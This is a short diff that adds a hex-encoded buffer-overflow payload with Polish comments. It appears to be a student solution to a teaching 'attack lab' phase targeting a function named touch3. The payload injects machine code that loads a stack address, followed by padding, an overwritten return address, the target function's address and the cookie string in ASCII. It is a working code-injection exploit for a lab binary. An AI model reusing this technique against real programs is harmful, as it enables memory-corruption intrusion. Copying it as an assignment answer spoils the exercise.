@@ -1,0 +1,8 @@
+48 c7 c7 40 d4 64 55 c3 /* 0x38(%rsp) - miejsce ciasteczka */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /* dotąd padding */
+08 d4 64 55 00 00 00 00 /* adres zwrotny %rsp */
+ae 1c 40 00 00 00 00 00 /* adres funkcji touch3 */
+32 63 32 65 64 64 62 38 /* string ciasteczka (cyfry -> ascii) */
